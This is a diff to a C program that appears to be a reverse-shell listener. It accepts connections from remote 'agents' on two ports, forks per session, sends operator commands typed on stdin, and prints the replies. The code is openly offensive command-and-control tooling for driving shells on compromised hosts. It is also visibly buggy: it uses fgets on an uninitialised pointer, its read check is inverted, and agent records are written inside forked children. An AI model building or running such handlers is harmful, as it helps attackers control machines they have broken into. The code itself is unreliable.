@@ -1,9 +1,11 @@
 #include <netinet/in.h>
-#include <string.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 
 #include "resh.h"
+#include "srv.h"
+
+#define MAXSHELLS 500
 
 typedef struct {
 	char *ip;
@@ -33,19 +35,30 @@ setupsock(int p)
 }
 
 void
-handleshell(int fd, agent *n)
+interact(int fd, agent *n)
 {
-	char buf[4096];
-	int recv;
+	char buf[8192];
+	char *cmd;
+	int cl; /* client, recieved from client */
+	int sb; /* sent bytes, holds send()'s return value */
 
 	while (1) {
-		if((recv = read(fd, &buf, sizeof(buf))) < 0) {
-			fprintf(stderr, "Failed to read data\n");
-		} else if (!recv) { /* Connection closed by client*/
+		printf("in while loop\n");
+		if ((cmd = fgets(cmd, sizeof(buf), stdin)))
+			die("Failed to read command\n");
+		if ((sb = send(fd, cmd, strlen(cmd), 0)) < 0) {
+			die("Failed to send command\n");
+		} else if (!sb) /* No bytes sent */
+			continue;
+
+		if((cl = recv(fd, &buf, sizeof(buf), 0)) < 0) {
+			die("Failed to read data\n");
+		} else if (!cl) { /* Connection closed by client*/
 			n->alive = 0;
 			die("Connection closed by: %s\n", n->ip);
 		} else {
-			printf("recv: %d\tbuf: %s\tindex: %d\n", recv, buf, n->index);
+			rtrim(buf);
+			printf("%.*s", (int) strlen(buf), buf); /* To only print the recieved bytes */
 		}
 	}
 }
@@ -58,6 +71,7 @@ listener(unsigned p0, unsigned p1)
 	fd0 = setupsock(p0);
 	fd1 = setupsock(p1);
 	printf("Now listening on port %d & %d\n", p0, p1);
+	agent agnts[MAXSHELLS]; /* Max amount of agents */
 
 	while(1) {
 		int sfd; /* session fd */
@@ -73,14 +87,17 @@ listener(unsigned p0, unsigned p1)
 		if ((pid = fork()) < 0)
 			die("Failed to create child process\n");
 		else if (!pid) { /* Child */
-			agent agnt = { inet_ntoa(inc_adr.sin_addr), index, 1 }; /* IP, index, alive */
+			agnts[index].ip = inet_ntoa(inc_adr.sin_addr); /* setup struct for agent */
+			agnts[index].index = index;
+			agnts[index].alive = 1;
 			close(fd0); /* If child, kill the server fp and handle shell recieved */
 			close(fd1);
 
-			handleshell(sfd, &agnt);
+			interact(sfd, &agnts[index]);
 			close(sfd);
+		} else { /* Parent */
+			index++; /* Next agent gets next index */
+			close(sfd); /* server doesn't need child fd */
 		}
-		index++; /* Next agent gets next index */
-		close(sfd); /* server doesn't need child fd */
 	}
 }
